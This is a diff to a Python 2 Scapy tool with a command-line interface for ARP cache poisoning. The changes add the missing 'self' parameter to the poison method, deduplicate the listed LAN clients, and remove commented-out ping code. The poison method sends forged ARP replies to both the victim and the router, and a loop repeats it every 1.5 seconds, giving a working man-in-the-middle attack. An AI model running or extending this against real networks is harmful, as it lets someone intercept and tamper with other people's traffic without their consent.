@@ -42,7 +42,6 @@ def arp_monitor_callback(pkt):
 	
 	
 class Arp:
-   
 #    def __init__(self, victim 
     routerIP = victimIP = routerMAC= victimMAC = None
 
@@ -51,8 +50,8 @@ class Arp:
         for s,r in ans:
             return r[Ether].src
         
-    def poison(routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
+        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))#TODO error
         send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
     
     def restore(routerIP, victimIP, routerMAC, victimMAC):
@@ -120,12 +119,12 @@ class CLI(cmd.Cmd):
 	"""Takes no arguments.
 	    Prints list of clientsList and MAC and IP addresses
 	    on LAN"""
-	#TODO use set to eliminate duplicates
 	#TODO split entires in the list by ip and mac
 	    # check if ip address is our ip and display some kinda flag so user knows
-	print "Length of clientsList: ", len(clientsList)
-	for x in clientsList:
-	    print x
+	sortedclientsList = sorted(set(clientsList))
+	print "Number of clients: ", len(sortedclientsList)
+	for x in sortedclientsList:
+	    print "\n", x
 	    
 	    
 
@@ -149,26 +148,10 @@ class CLI(cmd.Cmd):
 	    print "No ip entered"
 	else:
 	    print "\nPinging... ",arg,"\n"
-#	    pinglist = arg.split(" ")
-#	    print"\n pinglist: ", pinglist
-#	    host = pinglist[0]	
-#	    if len(pinglist) > 1 :
-#		count = int(pinglist[1])	
-	    
-	   # print"\n pinglist length: ",len(pinglist)
-#	    host = arg
-#	    count = 1
-#	    packet = IP(dst=host)/ICMP()
-#	    for x in range(count):
-#		ans = sr1(packet)
-		#ans.show()
-# set target ip and icmp-data
 	    ip_target = arg 
 	    data = "Space for Rent!"
-# define ip and icmp
 	    ip = IP()
 	    icmp = ICMP()
-# creat ip + icmp parameters
 	    ip.dst = ip_target
 	    icmp.type = 8
 	    icmp.code = 0
@@ -198,7 +181,6 @@ class CLI(cmd.Cmd):
 	    
 	    while 1:
 		arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
-		#TODO says I am passing it 5 arguments when it takes 4
 		time.sleep(1.5)
 	        
 	       
